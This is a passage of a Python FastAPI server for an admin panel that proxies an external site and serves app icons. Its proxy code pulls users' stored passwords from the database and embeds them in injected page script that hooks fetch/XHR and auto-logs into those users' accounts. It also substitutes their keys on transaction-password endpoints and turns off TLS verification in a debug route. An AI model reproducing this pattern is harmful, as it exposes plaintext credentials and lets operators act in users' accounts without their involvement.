                {'src': '/admin/api/pwa-icon-maskable/512', 'sizes': '512x512', 'type': 'image/png', 'purpose': 'maskable'},

            ]

            return Response(content=json.dumps(data), media_type="application/manifest+json")

    return Response(content="{}", media_type="application/manifest+json")



@app.get("/admin/api/pwa-icon/{size}")

async def pwa_icon_api(size: int):

    """通过API路径提供图标（绕过CDN对.png文件的拦截）"""

    if size not in (192, 512):

        size = 192

    path = os.path.join(os.path.dirname(__file__), f"pwa-icon-{size}.png")

    if os.path.exists(path):

        with open(path, "rb") as f:

            return Response(content=f.read(), media_type="image/png")

    return Response(status_code=404)



@app.get("/admin/api/pwa-icon-maskable/{size}")

async def pwa_icon_maskable_api(size: int):

    """Maskable图标（深色背景+安全区内Logo，适配Android自适应图标）"""

    if size not in (192, 512):

        size = 192

    path = os.path.join(os.path.dirname(__file__), f"pwa-icon-maskable-{size}.png")

    if os.path.exists(path):

        with open(path, "rb") as f:

            return Response(content=f.read(), media_type="image/png")

    return Response(status_code=404)



@app.get("/admin/api/pwa-widget")

async def pwa_widget_api():

    """通过API路径提供widget.js（绕过CDN对.js文件的拦截）"""

    js_path = os.path.join(os.path.dirname(__file__), "chat_widget.js")

    if os.path.exists(js_path):

        with open(js_path, "r", encoding="utf-8") as f:

            return Response(content=f.read(), media_type="application/javascript",

                            headers={"Cache-Control": "no-cache, no-store, must-revalidate",

                                     "Pragma": "no-cache", "Expires": "0"})

    return Response(content="// not found", media_type="application/javascript")



@app.get("/pwa-icon-{size}.png")

async def pwa_icon(size: int):

    """提供PWA图标（本地PNG文件）"""

    if size not in (192, 512):

        size = 192

    path = os.path.join(os.path.dirname(__file__), f"pwa-icon-{size}.png")

    if os.path.exists(path):

        with open(path, "rb") as f:

            return Response(content=f.read(), media_type="image/png")

    return Response(status_code=404)





@app.api_route("/cdn-cgi/{path:path}", methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"])
async def cdn_cgi_proxy(path: str, request: Request):
    if path == "rum":
        return Response(status_code=204)
    return await ak_web_proxy(request, f"cdn-cgi/{path}")


# ===== AK 网页代理（管理员内嵌浏览） =====
_browse_sessions: dict = {}          # {bs_id: {cookies, username, expires}}
_ak_auth_cache: dict = {}
_BROWSE_SESSION_TTL = 3600           # session 有效期 1 小时
_AK_BASE = "https://k937.com"  # AK 网站根地址
_AK_HOME_PATH = "/pages/home.html?first=true"
_ADMIN_AK_FORCE_DIRECT = True
_BROWSE_SESSION_COOKIE = "ak_admin_bs"
_AK_WEB_PREFIX = "/admin/ak-web"
_AK_NATIVE_WEB_PREFIX = "/ak-web"
_AK_SITE_PREFIX = "/admin/ak-site"


def _use_native_ak_rpc(site_prefix: str) -> bool:
    return site_prefix in (_AK_WEB_PREFIX, _AK_NATIVE_WEB_PREFIX)


def _extract_cookie_map(headers) -> dict:
    values = []
    try:
        values = list(headers.get_list("set-cookie"))
    except Exception:
        raw = headers.get("set-cookie") if headers else ""
        if raw:
            values = [raw]
    cookies = {}
    for item in values:
        kv = item.split(";", 1)[0].strip()
        if "=" in kv:
            ck, cv = kv.split("=", 1)
            cookies[ck.strip()] = cv.strip()
    return cookies


def _get_header_values(headers, name: str) -> list[str]:
    values = []
    try:
        values = list(headers.get_list(name))
    except Exception:
        raw = headers.get(name) if headers else ""
        if raw:
            values = [raw]
    return [str(v) for v in values if v]


def _normalize_proxy_set_cookie(value: str) -> str:
    parts = [p.strip() for p in str(value).split(";") if p.strip()]
    if not parts:
        return str(value)
    attrs = [parts[0]]
    has_path = False
    for item in parts[1:]:
        lowered = item.lower()
        if lowered.startswith("domain="):
            continue
        if lowered.startswith("path="):
            attrs.append("Path=/")
            has_path = True
            continue
        attrs.append(item)
    if not has_path:
        attrs.append("Path=/")
    return "; ".join(attrs)


def _mirror_upstream_set_cookies(response: Response, headers):
    for value in _get_header_values(headers, "set-cookie"):
        normalized = _normalize_proxy_set_cookie(value)
        response.raw_headers.append((b"set-cookie", normalized.encode("latin-1", errors="ignore")))
    return response


def _extract_userkey(data):
    if isinstance(data, dict):
        for k, v in data.items():
            if str(k).lower() in {"key", "userkey", "user_key", "ukey"} and v not in (None, ""):
                return str(v)
        for v in data.values():
            found = _extract_userkey(v)
            if found:
                return found
    elif isinstance(data, list):
        for item in data:
            found = _extract_userkey(item)
            if found:
                return found
    return ""


def _extract_login_user_id(login_result: dict) -> str:
    if not isinstance(login_result, dict):
        return ""
    user_data = login_result.get("UserData")
    if not isinstance(user_data, dict):
        return ""
    for key in ("Id", "ID", "UserID", "userid"):
        value = user_data.get(key)
        if value not in (None, ""):
            return str(value)
    return ""


def _build_ak_user_model(login_result: dict, userkey: str = "") -> dict:
    user_model = {}
    if isinstance(login_result, dict):
        user_data = login_result.get("UserData")
        if isinstance(user_data, dict):
            user_model = dict(user_data)
        result_key = login_result.get("Key")
        if result_key not in (None, ""):
            user_model["Key"] = str(result_key)
    key = userkey or user_model.get("Key") or _extract_userkey(login_result)
    if key:
        user_model["Key"] = key
    return user_model


def _build_ak_local_login_info(username: str, password: str) -> list:
    if not username or not password:
        return []
    return [{"account": username, "password": password}]


def _cache_ak_auth(username: str, password: str, result: dict, headers) -> dict:
    cached = {
        "cookies": _extract_cookie_map(headers),
        "userkey": _extract_userkey(result),
        "login_result": result,
        "password": password,
        "expires": time.time() + _BROWSE_SESSION_TTL,
    }
    _ak_auth_cache[username] = cached
    return cached


async def _apply_cached_auth_to_browse_session(session: dict, cached: dict, result: dict,
                                               username: str = "", password: str = ""):
    if username:
        session["username"] = username
    if password:
        session["password"] = password
    session["cookies"].update(cached.get("cookies", {}))
    session["login_result"] = result
    if cached.get("userkey"):
        session["userkey"] = cached.get("userkey", "")
    await _persist_browse_session_auth(session)


async def _persist_browse_session_auth(session: dict):
    username = (session.get("username") or "").strip()
    if not username:
        return
    cached = {
        "cookies": dict(session.get("cookies", {})),
        "userkey": session.get("userkey", ""),
        "login_result": session.get("login_result", {}),
        "password": session.get("password", ""),
        "expires": time.time() + _BROWSE_SESSION_TTL,
    }
    _ak_auth_cache[username] = cached
    try:
        await db.save_ak_auth_state(
            username,
            userkey=cached.get("userkey", ""),
            cookies=cached.get("cookies", {}),
            login_payload=cached.get("login_result", {}),
            ttl_seconds=_BROWSE_SESSION_TTL,
        )
    except Exception as e:
        logger.warning(f"[BrowseSession] 站点登录态持久化失败 {username}: {e}")


def _make_browse_entry_url(bs_id: str, site_prefix: str = _AK_WEB_PREFIX) -> str:
    return _make_browse_login_url(bs_id, site_prefix)


def _make_browse_login_url(bs_id: str, site_prefix: str = _AK_WEB_PREFIX) -> str:
    return f"{site_prefix}/pages/account/login.html"


def _build_cookie_header(cookies: dict) -> str:
    if not cookies:
        return ""
    return "; ".join(f"{k}={v}" for k, v in cookies.items() if k)


def _normalize_ak_rpc_referer(raw_url: str) -> str:
    raw_url = (raw_url or "").strip()
    if not raw_url:
        return ""
    try:
        parts = urlsplit(raw_url)
        path = parts.path or "/"
        if path.startswith(_AK_WEB_PREFIX):
            path = path[len(_AK_WEB_PREFIX):] or "/"
        elif path.startswith(_AK_SITE_PREFIX):
            path = path[len(_AK_SITE_PREFIX):] or "/"
        query_items = []
        for key, values in parse_qs(parts.query, keep_blank_values=True).items():
            if key == "bs":
                continue
            for value in values:
                query_items.append((key, value))
        query = urlencode(query_items)
        return urlunsplit((parts.scheme, parts.netloc, path, query, parts.fragment))
    except Exception:
        return raw_url


def _apply_ak_rpc_browser_headers(headers: dict, request: Request, referer: str = "") -> dict:
    rpc_headers = dict(headers or {})
    normalized_referer = _normalize_ak_rpc_referer(referer or request.headers.get("referer", ""))
    origin = (request.headers.get("origin") or "").strip()
    if normalized_referer:
        rpc_headers["referer"] = normalized_referer
        try:
            parts = urlsplit(normalized_referer)
            if parts.scheme and parts.netloc:
                origin = f"{parts.scheme}://{parts.netloc}"
        except Exception:
            pass
    if origin:
        rpc_headers["origin"] = origin
    copy_keys = (
        "accept-language",
        "accept-encoding",
        "priority",
        "sec-ch-ua",
        "sec-ch-ua-mobile",
        "sec-ch-ua-platform",
        "sec-fetch-site",
        "sec-fetch-mode",
        "sec-fetch-dest",
        "x-requested-with",
    )
    for key in copy_keys:
        value = request.headers.get(key)
        if value:
            rpc_headers[key] = value
    return rpc_headers


def _summarize_cookie_names(cookies: dict) -> str:
    if not isinstance(cookies, dict) or not cookies:
        return "-"
    names = sorted(str(k).strip() for k in cookies.keys() if str(k).strip())
    return ",".join(names) if names else "-"


def _resolve_browse_bs_candidates(request: Request, source_order=None):
    candidates = []
    seen = set()

    def add_candidate(bs_id: str, source: str):
        bs_id = (bs_id or "").strip()
        if not bs_id or bs_id in seen:
            return
        seen.add(bs_id)
        candidates.append((bs_id, source))

    referer = (request.headers.get("referer") or "").strip()
    source_order = tuple(source_order or ("query", "referer", "cookie"))
    for source in source_order:
        if source == "query":
            add_candidate(request.query_params.get("bs") or "", "query")
        elif source == "referer":
            if referer:
                try:
                    parts = urlsplit(referer)
                    if parts.path.startswith((_AK_SITE_PREFIX, _AK_WEB_PREFIX, "/ak-web")):
                        add_candidate((parse_qs(parts.query).get("bs") or [""])[0], "referer")
                except Exception:
                    pass
        elif source == "cookie":
            add_candidate(request.cookies.get(_BROWSE_SESSION_COOKIE) or "", "cookie")
    return candidates


def _resolve_browse_bs_context(request: Request, source_order=None):
    candidates = _resolve_browse_bs_candidates(request, source_order=source_order)
    if candidates:
        return candidates[0]
    return "", "none"


def _resolve_browse_bs_id(request: Request, source_order=None) -> str:
    return _resolve_browse_bs_context(request, source_order=source_order)[0]


def _get_browse_session(bs_id: str):
    session = _browse_sessions.get(bs_id)
    if session and time.time() > session.get("expires", 0):
        _browse_sessions.pop(bs_id, None)
        session = None
    return session


def _resolve_browse_session(request: Request, preferred_username: str = "", source_order=None):
    candidates = _resolve_browse_bs_candidates(request, source_order=source_order)
    session = None
    wanted = (preferred_username or "").strip().lower()
    if wanted:
        for bs_id, bs_source in candidates:
            session = _get_browse_session(bs_id)
            if session and (session.get("username") or "").strip().lower() == wanted:
                return bs_id, session, bs_source
    for bs_id, bs_source in candidates:
        session = _get_browse_session(bs_id)
        if session:
            return bs_id, session, bs_source
    bs_id, bs_source = candidates[0] if candidates else ("", "none")
    return bs_id, session, bs_source


def _set_browse_session_cookie(response: Response, bs_id: str):
    if not bs_id:
        return response
    response.delete_cookie(key=_BROWSE_SESSION_COOKIE, path="/")
    response.delete_cookie(key=_BROWSE_SESSION_COOKIE, path="/admin")
    response.set_cookie(
        key=_BROWSE_SESSION_COOKIE,
        value=bs_id,
        max_age=_BROWSE_SESSION_TTL,
        path="/",
        httponly=True,
        samesite="lax",
    )
    return response


def _apply_no_store_headers(response: Response):
    response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    return response


def _rewrite_site_root_url(url: str, site_prefix: str) -> str:
    if not url or not url.startswith("/"):
        return url
    if url.startswith("//"):
        return url
    if url.startswith(site_prefix) or url.startswith("/admin/ak-rpc") or url.startswith("/admin"):
        return url
    if url.startswith("/RPC"):
        if _use_native_ak_rpc(site_prefix):
            return url
        return "/admin/ak-rpc" + url[4:]
    return site_prefix + url


def _rewrite_site_html_roots(text: str, site_prefix: str) -> str:
    pattern = re.compile(r'(?P<prefix>\b(?:src|href|action|poster)=\s*["\"])(?P<url>/[^"\\r\\n>]*)(?P<suffix>["\"])', re.IGNORECASE)
    return pattern.sub(lambda m: f"{m.group('prefix')}{_rewrite_site_root_url(m.group('url'), site_prefix)}{m.group('suffix')}", text)


def _rewrite_site_css_roots(text: str, site_prefix: str) -> str:
    pattern = re.compile(r'url\((?P<quote>["\']?)(?P<url>/[^)"\']+)(?P=quote)\)', re.IGNORECASE)
    return pattern.sub(lambda m: f"url({m.group('quote')}{_rewrite_site_root_url(m.group('url'), site_prefix)}{m.group('quote')})", text)


def _rewrite_base_js_rpc_roots(text: str) -> tuple[str, bool]:
    rewritten = re.sub(r'https?://[^/"\'\s]+/RPC/', '/admin/ak-rpc/', text, flags=re.IGNORECASE)
    return rewritten, rewritten != text


def _rewrite_base_js_native_rpc_roots(text: str) -> tuple[str, bool]:
    rewritten = re.sub(r'https?://[^/"\'\s]+/RPC/', '/RPC/', text, flags=re.IGNORECASE)
    return rewritten, rewritten != text


def _inject_base_js_no_login_probe(text: str) -> tuple[str, bool]:
    text, rewritten = _rewrite_base_js_rpc_roots(text)
    marker = "[AKBaseNoLogin]"
    if marker in text:
        return text, rewritten
    probe = (
        "(function(){"
        "try{if(window.__akBaseNoLoginProbeInstalled)return;window.__akBaseNoLoginProbeInstalled=true;"
        "function akBaseUserKey(){try{return(window.APP&&APP.USER&&APP.USER.MODEL&&APP.USER.MODEL.Key)||'';}catch(_e){return '';}}"
        "function akBaseBody(body){try{if(body==null)return null;if(typeof body==='string')return body.slice(0,500);if(typeof URLSearchParams!=='undefined'&&body instanceof URLSearchParams)return body.toString().slice(0,500);if(typeof FormData!=='undefined'&&body instanceof FormData){var out=[];body.forEach(function(v,k){out.push([k,typeof v==='string'?v:String(v)]);});return JSON.stringify(out).slice(0,500);}if(typeof body==='object')return JSON.stringify(body).slice(0,500);return String(body).slice(0,500);}catch(_e){try{return String(body).slice(0,500);}catch(__e){return '[unserializable]';}}}"
        "function akBaseHasNoLogin(body){try{if(body==null)return false;var txt=typeof body==='string'?body:String(body),norm=txt.toLowerCase().replace(/\\s+/g,'');if(txt.indexOf('用戶未登錄')>=0)return true;return norm.indexOf('\\\"islogin\\\":false')>=0&&norm.indexOf('\\\"error\\\":true')>=0;}catch(_e){return false;}}"
        "function akBaseEmit(meta){try{if(window.console&&typeof console.warn==='function'){console.warn('[AKBaseNoLogin]',meta);}}catch(_e){}}"
        "function akBaseRw(url){try{var s=String(url||'');if(!s)return s;var x=new URL(s,location.href),p=(x.pathname||'');if(p.indexOf('/RPC/')!==0)return s;return '/admin/ak-rpc/'+p.slice(5)+x.search+x.hash;}catch(_e){var s2=String(url||'');if(s2.indexOf('/RPC/')===0)return '/admin/ak-rpc/'+s2.slice(5);return s2;}}"
        "var xo=XMLHttpRequest.prototype.open,xs=XMLHttpRequest.prototype.send;"
        "XMLHttpRequest.prototype.open=function(method,url){var nextUrl=akBaseRw(url||'');this.__akBaseMethod=method||'GET';this.__akBaseUrl=nextUrl||'';return xo.apply(this,[method,nextUrl].concat([].slice.call(arguments,2)));};"
        "XMLHttpRequest.prototype.send=function(body){try{this.__akBaseBody=akBaseBody(body);}catch(_e){}if(!this.__akBaseNoLoginBound){this.__akBaseNoLoginBound=true;this.addEventListener('loadend',function(){try{var resp=this.responseText||this.response||'';if(!akBaseHasNoLogin(resp))return;akBaseEmit({transport:'xhr',method:this.__akBaseMethod||'',optionUrl:this.__akBaseUrl||'',actualUrl:this.responseURL||'',status:this.status||0,data:this.__akBaseBody||null,userkey:akBaseUserKey(),responseHead:String(resp).slice(0,300),current:location.href});}catch(__e){}});}return xs.apply(this,arguments);};"
        "if(typeof window.fetch==='function'){var of=window.fetch;window.fetch=function(input,init){var method='GET',url='',body=null;try{if(typeof input==='string'){url=akBaseRw(input);method=(init&&init.method)||'GET';body=init&&Object.prototype.hasOwnProperty.call(init,'body')?init.body:null;input=url;}else if(input&&typeof input==='object'){url=akBaseRw(input.url||'');method=(init&&init.method)||(input.method)||'GET';body=init&&Object.prototype.hasOwnProperty.call(init,'body')?init.body:(Object.prototype.hasOwnProperty.call(input,'_bodyInit')?input._bodyInit:null);if(url!==(input.url||''))input=new Request(url,input);}}catch(_e){}return of.apply(this,[input,init]).then(function(resp){try{resp.clone().text().then(function(txt){if(!akBaseHasNoLogin(txt))return;akBaseEmit({transport:'fetch',method:method||'GET',optionUrl:url||'',actualUrl:(resp&&resp.url)||'',status:(resp&&resp.status)||0,data:akBaseBody(body),userkey:akBaseUserKey(),responseHead:String(txt).slice(0,300),current:location.href});}).catch(function(){});}catch(_e){}return resp;});};}"
        "}catch(__akBaseProbeError){}})();"
    )
    return probe + text, True


async def _load_cached_ak_auth(username: str, password: str = "") -> dict:
    username = (username or "").strip()
    if not username:
        return {}
    cached = _ak_auth_cache.get(username)
    if cached and time.time() < cached.get("expires", 0):
        if password and not cached.get("password"):
            cached["password"] = password
        return cached
    _ak_auth_cache.pop(username, None)
    persisted = None
    try:
        persisted = await db.load_ak_auth_state(username)
    except Exception as e:
        logger.warning(f"[AKAuth] 读取持久化登录态失败 {username}: {e}")
        persisted = None
    if not persisted:
        return {}
    cached = {
        "cookies": dict(persisted.get("cookies", {})),
        "userkey": persisted.get("userkey", ""),
        "login_result": persisted.get("login_result", {}),
        "password": password,
        "expires": time.time() + _BROWSE_SESSION_TTL,
    }
    _ak_auth_cache[username] = cached
    return cached


@app.post("/admin/api/ak_auth/clear")
async def admin_clear_ak_auth(request: Request):
    data = await request.json()
    username = (data.get("username") or "").strip().lower()
    if not username:
        return JSONResponse({"success": False, "message": "缺少用户名"})
    _ak_auth_cache.pop(username, None)
    try:
        await db.clear_ak_auth_state(username)
    except Exception as e:
        return JSONResponse({"success": False, "message": f"清理失败: {str(e)}"})
    return JSONResponse({"success": True})


@app.get("/admin/api/ak_test")
async def admin_ak_test():
    """调试：对比两种httpx调用方式的结果，精确定位302来源"""
    url = f"{_AK_BASE}/pages/account/login.html"
    hdrs = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.9",
    }
    results = {}
    # 方式A：c.get() + follow_redirects在构造函数
    try:
        async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15) as c:
            r = await c.get(url, headers=hdrs)
        results["A_get_constructor"] = {
            "status": r.status_code, "final_url": str(r.url),
            "content_len": len(r.content),
            "head": r.content[:100].decode("utf-8", errors="replace"),
        }
    except Exception as e:
        results["A_get_constructor"] = {"error": str(e)}
    # 方式B：client.request() + follow_redirects在request()参数（同ak_web_proxy当前代码）
    try:
        async with httpx.AsyncClient(verify=False, timeout=15, cookies={}) as c:
            r = await c.request("GET", url, headers=hdrs, content=None, follow_redirects=True)
        results["B_request_param"] = {
            "status": r.status_code, "final_url": str(r.url),
            "content_len": len(r.content),
            "head": r.content[:100].decode("utf-8", errors="replace"),
        }
    except Exception as e:
        results["B_request_param"] = {"error": str(e)}
    return results


async def _forward_admin_ak_rpc_request(path: str, request: Request, session: dict,
                                        referer: str = "", fetch_dest: str = "", accept: str = ""):
    content_type = request.headers.get("content-type", "")
    raw_body = await request.body() if request.method in ["POST", "PUT"] else b""
    query_params = {k: v for k, v in dict(request.query_params).items() if k != "bs"}
    params = parse_request_params(content_type, query_params, raw_body)
    is_login_path = path.strip("/").lower() == "login"
    normalized_path = path.strip("/").lower()
    protected_paths = {
        "public_ep_sellrecords1",
        "public_ep_sellrecords2",
        "public_ep_sellrecords3",
        "question_get1",
        "check_transactionpassword",
        "check_answer",
        "logout",
    }
    trace_paths = {
        "public_ace",
        "public_ep_sellrecords1",
        "question_get1",
    }
    trace_params_before = dict(params) if normalized_path in trace_paths else None
    auth_replaced = False
    selected_exit = None
    pinned_exit_name = str(session.get("ak_exit_name") or "").strip()
    if _ADMIN_AK_FORCE_DIRECT:
        selected_exit = _get_direct_exit()
        session.pop("ak_exit_name", None)
        logger.warning(
            f"[AdminAkRpcExit/{path}] force_direct=1 preferred={pinned_exit_name or '-'} "
            f"using={selected_exit.name} referer={referer}"
        )
    else:
        selected_exit = _select_forward_exit(path, is_login=is_login_path, preferred_exit_name=pinned_exit_name)
        logger.warning(
            f"[AdminAkRpcExit/{path}] pinned={int(bool(pinned_exit_name))} preferred={pinned_exit_name or '-'} "
            f"using={selected_exit.name} referer={referer}"
        )
    if trace_params_before is not None:
        logger.warning(
            f"[AdminAkRpcParams/{path}] phase=incoming referer={referer} "
            f"params={json.dumps(trace_params_before, ensure_ascii=False)}"
        )
    if normalized_path in protected_paths:
        login_result = session.get("login_result", {})
        if not isinstance(login_result, dict):
            login_result = {}
        user_data = login_result.get("UserData")
        if not isinstance(user_data, dict):
            user_data = {}
        session_userkey = str(session.get("userkey") or _extract_userkey(login_result) or "").strip()
        session_user_id = str(user_data.get("Id") or user_data.get("ID") or "").strip()
        current_key = str(params.get("key") or "").strip().lower()
        current_user_id = str(params.get("UserID") or params.get("userid") or "").strip().lower()
        if session_userkey and current_key in {"", "123", "undefined", "null"}:
            params["key"] = session_userkey
            auth_replaced = True
        if session_user_id and current_user_id in {"", "123", "undefined", "null"}:
            params["UserID"] = session_user_id
            auth_replaced = True
        if auth_replaced and request.method in ["POST", "PUT"]:
            if "application/json" in content_type:
                raw_body = json.dumps(params, ensure_ascii=False).encode("utf-8")
            else:
                raw_body = urlencode(params).encode("utf-8")
        logger.warning(
            f"[AdminAkRpcAuth/{path}] replaced={int(auth_replaced)} key={str(params.get('key') or '')[:8]} "
            f"userId={str(params.get('UserID') or params.get('userid') or '')} referer={referer}"
        )
    if trace_params_before is not None:
        logger.warning(
            f"[AdminAkRpcParams/{path}] phase=forward referer={referer} "
            f"params={json.dumps(params, ensure_ascii=False)}"
        )
    headers = dict(request.headers)
    headers = _apply_ak_rpc_browser_headers(headers, request, referer=referer)
    logger.warning(
        f"[AdminAkRpcHeaders/{path}] origin={headers.get('origin', '-') or '-'} "
        f"referer={headers.get('referer', '-') or '-'} "
        f"fetch={headers.get('sec-fetch-site', '-') or '-'}/{headers.get('sec-fetch-mode', '-') or '-'}/{headers.get('sec-fetch-dest', '-') or '-'}"
    )
    cookie_header = _build_cookie_header(session.get("cookies", {}))
    if cookie_header:
        headers["cookie"] = cookie_header

    response = await forward_request(
        request.method, path, content_type, params, raw_body, headers,
        client_ip=request.client.host if request.client else "admin-panel",
        is_login=is_login_path,
        selected_exit=selected_exit,
        force_direct=_ADMIN_AK_FORCE_DIRECT
    )
    set_cookie_values = response.headers.get_list("set-cookie")
    for sc in response.headers.get_list("set-cookie"):
        kv = sc.split(";", 1)[0].strip()
        if "=" in kv:
            ck, cv = kv.split("=", 1)
            session["cookies"][ck.strip()] = cv.strip()
    try:
        result = response.json()
        should_persist = bool(set_cookie_values)
        is_login_success = is_login_path and (result.get("Error") is False or (not result.get("Error") and result.get("UserData")))
        if is_login_success:
            account = (params.get("account") or params.get("username") or session.get("username") or "").strip()
            password = (params.get("password") or session.get("password") or "").strip()
            cached = _cache_ak_auth(account, password, result, response.headers)
            await _apply_cached_auth_to_browse_session(session, cached, result, account, password)
            if selected_exit and not _ADMIN_AK_FORCE_DIRECT:
                session["ak_exit_name"] = selected_exit.name
                logger.warning(f"[AdminAkRpcExit/{path}] bind={selected_exit.name} referer={referer}")
            logger.warning(
                f"[AdminAkRpcLoginCookies/{path}] bs={session.get('id', '')} set_cookie_count={len(cached.get('cookies', {}))} "
                f"set_cookie_names={_summarize_cookie_names(cached.get('cookies', {}))} "
                f"session_cookie_count={len(session.get('cookies', {}))} "
                f"session_cookie_names={_summarize_cookie_names(session.get('cookies', {}))}"
            )
            should_persist = True
        if should_persist:
            await _persist_browse_session_auth(session)
        if is_login_path:
            logger.warning(f"[IframeLoginApi] route=/admin/ak-rpc/Login phase=response status={response.status_code} referer={referer} body_head={json.dumps(result, ensure_ascii=False)[:200]}")
        logger.warning(f"[AdminAkRpc/{path}] status={response.status_code} dest={fetch_dest} accept={accept} referer={referer} body_head={json.dumps(result, ensure_ascii=False)[:200]}")
        proxy_response = JSONResponse(content=result, status_code=response.status_code)
        return _mirror_upstream_set_cookies(proxy_response, response.headers)
    except Exception:
        if set_cookie_values:
            await _persist_browse_session_auth(session)
        logger.warning(f"[AdminAkRpc/{path}] status={response.status_code} dest={fetch_dest} accept={accept} referer={referer} content_type={response.headers.get('content-type','')}")
        proxy_response = Response(content=response.content, status_code=response.status_code,
                        media_type=response.headers.get("content-type", "application/octet-stream"))
        return _mirror_upstream_set_cookies(proxy_response, response.headers)


@app.api_route("/admin/ak-rpc/{path:path}", methods=["GET", "POST", "PUT", "DELETE"])
async def admin_ak_rpc(path: str, request: Request):
    referer = request.headers.get("referer", "")
    fetch_dest = request.headers.get("sec-fetch-dest", "")
    accept = request.headers.get("accept", "")
    cookie_bs = (request.cookies.get(_BROWSE_SESSION_COOKIE) or "").strip()
    preferred_username = ""
    if path.strip("/").lower() == "login":
        content_type = request.headers.get("content-type", "")
        raw_body = await request.body() if request.method in ["POST", "PUT"] else b""
        params = parse_request_params(content_type, dict(request.query_params), raw_body)
        preferred_username = str(params.get("account") or params.get("username") or "").strip()
    bs_id, session, bs_source = _resolve_browse_session(
        request,
        preferred_username=preferred_username,
        source_order=("cookie",),
    )
    if path.strip("/").lower() == "login":
        logger.warning(f"[IframeLoginApi] route=/admin/ak-rpc/Login phase=request bs={bs_id} source={bs_source} cookie_bs={cookie_bs} referer={referer}")
    if not session:
        logger.warning(f"[AdminAkRpc/{path}] no_session bs={bs_id} source={bs_source} cookie_bs={cookie_bs} dest={fetch_dest} accept={accept} referer={referer}")
        return JSONResponse({"Error": True, "IsLogin": False, "Msg": "用戶未登錄"})

    try:
        return await _forward_admin_ak_rpc_request(path, request, session, referer, fetch_dest, accept)
    except Exception as e:
        logger.error(f"[AdminAkRpc/{path}] 转发失败: {e}")
        return JSONResponse({"Error": True, "IsLogin": False, "Msg": f"请求失败: {str(e)}"}, status_code=500)


@app.post("/admin/api/browse_login")
async def admin_browse_login(request: Request):
    """为后台内嵌网页创建全新浏览 session，始终从登录页进入"""
    data = await request.json()
    username = data.get("username", "").strip()
    if not username:
        return JSONResponse({"success": False, "message": "缺少用户名"})
    password = await db.get_user_password(username)
    if not password:
        return JSONResponse({"success": False, "message": f"用户 {username} 无密码记录"})
    try:
        bs_id = secrets.token_hex(16)
        _browse_sessions[bs_id] = {
            "cookies": {},
            "username": username,
            "password": password,
            "userkey": "",
            "login_result": {},
            "expires": time.time() + _BROWSE_SESSION_TTL,
        }
        return _set_browse_session_cookie(
            JSONResponse({"success": True, "bs_id": bs_id}),
            bs_id,
        )
    except Exception as e:
        return JSONResponse({"success": False, "message": f"登录失败: {str(e)}"})


def _build_injector(bs_id: str, username: str = "", password: str = "", userkey: str = "", login_result: dict = None,
                    site_prefix: str = _AK_SITE_PREFIX) -> str:
    """生成注入到 HTML 的 JS 拦截器：劫持 fetch/XHR + 自动登录（如在登录页）"""
    safe_user = username.replace("\\", "\\\\").replace("'", "\\'")
    safe_pwd = password.replace("\\", "\\\\").replace("'", "\\'")
    login_result_json = json.dumps(login_result or {}, ensure_ascii=False).replace("</", "<\\/")
    user_model_json = json.dumps(_build_ak_user_model(login_result or {}, userkey), ensure_ascii=False).replace("</", "<\\/")
    local_login_info_json = json.dumps(_build_ak_local_login_info(username, password), ensure_ascii=False).replace("</", "<\\/")
    api_base_storage = AKAPI_URL if AKAPI_URL.endswith("/") else AKAPI_URL + "/"
    ak_list = ",".join(
        f"'{d}'" for d in [_AK_BASE, "https://ak928.vip", "http://ak928.vip",
                           "https://www.ak928.vip", "https://k937.com", "http://k937.com"]
    )
    # AK API 基础 URL，去掉末尾斜杠
    api_base = AKAPI_URL.rstrip("/")
    auto_login = ""
    if safe_user and safe_pwd:
        auto_login = (
            "var _t=0,_iv=setInterval(function(){"
            "if(++_t>100){clearInterval(_iv);return;}"
            "if(typeof _vue!=='undefined'&&_vue&&_vue.form&&!_vue.isLogin){"
            "clearInterval(_iv);"
            "_vue.form.account='" + safe_user + "';"
            "_vue.form.password='" + safe_pwd + "';"
            "setTimeout(function(){"
            "_vue.checkInput&&_vue.checkInput();"
            "try{if(typeof _vue.login==='function'){_vue.login();return;}if(typeof _vue.Login==='function'){_vue.Login();return;}if(typeof _vue.submit==='function'){_vue.submit();return;}if(typeof _vue.onSubmit==='function'){_vue.onSubmit();return;}}catch(_e){}"
            "var _btn=document.querySelector('button[type=submit],.login-btn,.btn-login,.el-button--primary');if(_btn){_btn.click();}"
            "},200);"
            "}"
            "},100);"
        )
    js = (
        "<script>(function(){"
        "if('serviceWorker' in navigator){navigator.serviceWorker.register=function(){return Promise.reject(new Error('SW disabled'));};}"
        "try{var UK=" + json.dumps(userkey or "", ensure_ascii=False) + ";var LR=" + login_result_json + ";var UM=" + user_model_json + ";var LI=" + local_login_info_json + ";var RPC='/admin/ak-rpc/';var P=" + json.dumps(site_prefix, ensure_ascii=False) + ";var B='" + bs_id + "';var LS=[localStorage,sessionStorage];var HA=!!(UK||(UM&&typeof UM==='object'&&(UM.Key||UM.key||UM.Id||UM.id))||(LR&&typeof LR==='object'&&LR.UserData&&typeof LR.UserData==='object'&&(LR.UserData.Id||LR.UserData.ID||LR.UserData.Key||LR.UserData.key)));var BK=['AKapp_base_url','AK_local_login_info'];var AK=['AK_user_model','userkey','UserKey','ak_login_result','UserData'];for(var si=0;si<LS.length;si++){for(var bi=0;bi<BK.length;bi++){try{LS[si].removeItem(BK[bi]);}catch(__e){}}if(HA){for(var ai=0;ai<AK.length;ai++){try{LS[si].removeItem(AK[ai]);}catch(__e){}}}try{LS[si].setItem('AKapp_base_url',RPC);}catch(__e){}try{LS[si].setItem('AK_local_login_info',JSON.stringify(LI||[]));}catch(__e){}if(HA){try{LS[si].setItem('AK_user_model',JSON.stringify(UM&&typeof UM==='object'?UM:{}));}catch(__e){}try{LS[si].setItem('userkey',UK||'');LS[si].setItem('UserKey',UK||'');}catch(__e){}try{LS[si].setItem('ak_login_result',JSON.stringify(LR&&typeof LR==='object'?LR:{}));}catch(__e){}try{LS[si].setItem('UserData',JSON.stringify(LR&&typeof LR==='object'&&LR.UserData&&typeof LR.UserData==='object'?LR.UserData:{}));}catch(__e){}}}if(HA){window.USER_MODEL=UM&&typeof 